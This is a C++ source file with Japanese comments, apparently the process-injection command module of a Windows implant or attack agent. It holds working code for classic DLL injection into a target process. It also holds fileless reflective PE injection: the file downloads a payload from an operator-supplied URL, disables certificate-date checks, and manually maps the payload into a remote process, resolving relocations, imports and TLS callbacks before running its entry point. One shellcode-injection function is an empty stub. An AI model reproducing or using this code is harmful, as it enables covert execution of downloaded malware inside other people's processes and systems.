// プロセスインジェクションのコマンド
#include "ProcessInjection.h"





// ノーマルのDLLインジェクション
void DllInjection(std::vector<std::string>& tokens) {
    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr = 
            "使用方法: injectdll <プロセスID> <DLLパス>" + newline +
            "リモートプロセスにDLLをロードします";

        SendString(helpStr);
        return;
    }

    if (tokens.size() < 3) {
        SendString("使用方法: dllinject <プロセスID> <DLLパス>");
        return;
    }

    // 引数からプロセスIDとDLLのパスを取得
    DWORD processId = std::stoi(tokens[1]);
    std::string dllPath = tokens[2];

    // DLLパスがダブルクォーテーションで囲まれている場合トリミング
    if (dllPath.front() == '\"' && dllPath.back() == '\"') {
        dllPath = dllPath.substr(1, dllPath.size() - 2);
    }

    // 相対パスを絶対パスに変換
    std::filesystem::path absolutePath = std::filesystem::absolute(dllPath);

    // DLLの存在を確認
    if (!std::filesystem::exists(absolutePath)) {
        SendString("[-] DLLが存在しません: " + absolutePath.string());
        return;
    }

    // DLLパスサイズを計算
    SIZE_T dllPathSize = (absolutePath.string().size() + 1) * sizeof(char); // charサイズに修正

    // プロセスを開く
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == nullptr) {
        SendString("[-] プロセスを開けませんでした: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] プロセスハンドル取得");

    // DLLパスサイズ分のメモリ領域を確保する
    LPVOID dllPathMemory = VirtualAllocEx(processHandle, nullptr, dllPathSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathMemory == nullptr) {
        SendString("[-] ターゲットプロセス内にメモリを割り当てられませんでした: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] リモートプロセスにメモリ割り当て");

    // DLLのパスを書き込む
    if (!WriteProcessMemory(processHandle, dllPathMemory, absolutePath.string().c_str(), dllPathSize, nullptr)) {
        SendString("[-] DLLパスの書き込みができませんでした: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] DLLパスの書き込み");

    // リモートスレッドを作成する
    HANDLE threadHandle = CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), dllPathMemory, 0, nullptr);
    if (threadHandle == nullptr) {
        SendString("[-] リモートスレッドを作成できませんでした: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] リモートスレッドの作成");

    SendString("[+] DLLインジェクション成功");
}

void FilelessShellcodeInjection(std::vector<std::string>& tokens) {

}




// ファイルレス反射型DLLインジェクション
void FilelessReflectiveDLLInjection(std::vector<std::string>& tokens) {
    // ヘルプ
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "[+] 使用方法: frefinject <プロセスID> <PEのURL>\n"
            "[+] リモートプロセスにPEを反射型ロードします";

        SendString(helpStr);
        return;
    }

    if (tokens.size() < 3) {
        SendString("[-] 使用方法: frefinject <プロセスID> <PEのURL>");
        return;
    }

    // 引数からプロセスIDとDLLのパスを取得
    DWORD processId = std::stoi(tokens[1]);
    std::string urlPath = tokens[2];

    std::vector<BYTE> shellcode;
    bool isStage = StagingPayloadViaHttp(urlPath, shellcode);
    if (!isStage) {
        SendString("[-] ペイロードのステージングに失敗");
        return;
    }
    SendString("[+] ペイロードのステージ");

    PBYTE downloadPayload = reinterpret_cast<PBYTE>(shellcode.data());

    // プロセスを開く
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == nullptr) {
        SendString("[-] プロセスを開けませんでした: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] プロセスハンドルの取得");

    // 各PEヘッダの先頭アドレスを取得
    PIMAGE_DOS_HEADER pOldDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(downloadPayload);
    PIMAGE_NT_HEADERS pOldNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(downloadPayload + reinterpret_cast<PIMAGE_DOS_HEADER>(downloadPayload)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOldOptionalHeader = &pOldNtHeader->OptionalHeader;
    PIMAGE_FILE_HEADER pOldFileHeader = &pOldNtHeader->FileHeader;
    SendString("[+] PEヘッダー情報の取得");

    // SizeOfImage分のメモリを確保
    PBYTE pBase = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, pOldOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!pBase) {
        SendString("[-] メモリ確保に失敗しました: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] メモリの確保");

    // 反射型ローダーの引数を格納
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.pbase = pBase;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = 0;

    // ヘッダーをコピー
    if (!WriteProcessMemory(processHandle, pBase, downloadPayload, pOldOptionalHeader->SizeOfHeaders, nullptr)) {
        SendString("[-] ヘッダーのコピーに失敗しました: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] ヘッダーのコピー");

    // セクションをコピー
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
    for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
        if (pSectionHeader->SizeOfRawData) {
            if (!WriteProcessMemory(processHandle, pBase + pSectionHeader->VirtualAddress, downloadPayload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr)) {
                SendString("[-] セクション " + std::to_string(i) + " のコピーに失敗しました: " + std::to_string(GetLastError()));
                return;
            }
            SendString("[+] セクション " + std::to_string(i) + " のコピー");
        }
    }

    // 反射型ローダーを書き込む
    PBYTE pReflectiveLoader = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    if (!pReflectiveLoader || !WriteProcessMemory(processHandle, pReflectiveLoader, ReflectiveLoader, 0x1000, nullptr)) {
        SendString("[-] 反射型ローダーの書き込みに失敗しました: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] 反射型ローダーの書き込み");

    // 反射型ローダーの引数を書き込む
    LPVOID pReflectiveLoaderArg = VirtualAllocEx(processHandle, nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pReflectiveLoaderArg || !WriteProcessMemory(processHandle, pReflectiveLoaderArg, &data, sizeof(MANUAL_MAPPING_DATA), nullptr)) {
        SendString("[-] 反射型ローダー引数の書き込みに失敗しました: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] 反射型ローダーの引数を書き込み");

    // リモートスレッドを作成して反射型ローダーを起動
    if (!CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pReflectiveLoader), pReflectiveLoaderArg, 0, nullptr)) {
        SendString("[-] リモートスレッドの作成に失敗しました: " + std::to_string(GetLastError()));
        return;
    }
    SendString("[+] リモートスレッドの作成");
}


// 反射型ローダー関数
void __stdcall ReflectiveLoader(MANUAL_MAPPING_DATA* pData) {
    PBYTE baseAddress = pData->pbase;

    // PEヘッダの先頭アドレスを取得
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(baseAddress);
    PIMAGE_NT_HEADERS pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(baseAddress + reinterpret_cast<PIMAGE_DOS_HEADER>(pDosHeader)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;

    // 関数ポインタ変数を定義
    f_LoadLibraryA _LoadLibraryA = pData->pLoadLibraryA;
    f_GetProcAddress _GetProcAddress = pData->pGetProcAddress;
    f_DLL_ENTRY_POINT _DllMain = reinterpret_cast<f_DLL_ENTRY_POINT>(baseAddress + pOptionalHeader->AddressOfEntryPoint);

    // ベース再配置
    PBYTE locationDelta = baseAddress - pOptionalHeader->ImageBase;
    if (locationDelta) {
        if (!pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) return;

        PIMAGE_BASE_RELOCATION pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        PIMAGE_BASE_RELOCATION pRelocEnd = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uintptr_t>(pRelocData) + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

        while (pRelocData < pRelocEnd && pRelocData->SizeOfBlock) {
            UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD pRelativeInfo = reinterpret_cast<PWORD>(pRelocData + 1);

            for (UINT i = 0; i != AmountOfEntries; ++i, ++pRelativeInfo) {
                if ((*pRelativeInfo >> 0x0C) == IMAGE_REL_BASED_DIR64) {
                    PUINT_PTR pPatch = reinterpret_cast<PUINT_PTR>(baseAddress + pRelocData->VirtualAddress + ((*pRelativeInfo) & 0xFFF));
                    *pPatch += reinterpret_cast<UINT_PTR>(locationDelta);
                }
            }
            pRelocData = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<PBYTE>(pRelocData) + pRelocData->SizeOfBlock);
        }
    }

    // IAT解決
    if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (pImportDescriptor->Name) {
            LPCSTR szMod = reinterpret_cast<LPCSTR>(baseAddress + pImportDescriptor->Name);
            HINSTANCE hDll = _LoadLibraryA(szMod);
            PULONG_PTR pThunkRef = reinterpret_cast<PULONG_PTR>(baseAddress + pImportDescriptor->OriginalFirstThunk);
            PULONG_PTR pFuncRef = reinterpret_cast<PULONG_PTR>(baseAddress + pImportDescriptor->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            for (; *pThunkRef; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(*pThunkRef)) {
                    *pFuncRef = reinterpret_cast<ULONG_PTR>(_GetProcAddress(hDll, reinterpret_cast<char*>(*pThunkRef & 0xFFFF)));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pImport = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(baseAddress + (*pThunkRef));
                    *pFuncRef = reinterpret_cast<ULONG_PTR>(_GetProcAddress(hDll, pImport->Name));
                }
            }
            ++pImportDescriptor;
        }
    }

    // TLSコールバックがあれば呼び出す
    if (pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
        PIMAGE_TLS_DIRECTORY pTLS = reinterpret_cast<IMAGE_TLS_DIRECTORY*>(baseAddress + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        PIMAGE_TLS_CALLBACK* pCallback = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(pTLS->AddressOfCallBacks);
        for (; pCallback && *pCallback; ++pCallback)
            (*pCallback)(baseAddress, DLL_PROCESS_ATTACH, nullptr);
    }

    // エントリポイント呼び出し
    _DllMain(baseAddress, pData->fdwReasonParam, pData->reservedParam);
}

// ファイルサーバーからペイロードをステージング
bool StagingPayloadViaHttp(const std::string& url, std::vector<BYTE>& shellcode) {
    // 初期値設定
    HINTERNET internetHandle = InternetOpen(L"Payload Stager", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!internetHandle) {
        return false;
    }

    // URLを開く
    HINTERNET urlHandle = InternetOpenUrlA(internetHandle, url.c_str(), nullptr, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!urlHandle) {
        InternetCloseHandle(internetHandle);
        return false;
    }

    DWORD bytesRead;
    BYTE buffer[1024];

    // シェルコードを読み込むループ
    while (true) {
        // URLからデータを読み込む
        if (!InternetReadFile(urlHandle, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0) {
            break;
        }

        // 読み込んだデータをベクターに追加
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    // リソースを解放
    InternetCloseHandle(urlHandle);
    InternetCloseHandle(internetHandle);

    return !shellcode.empty();
}
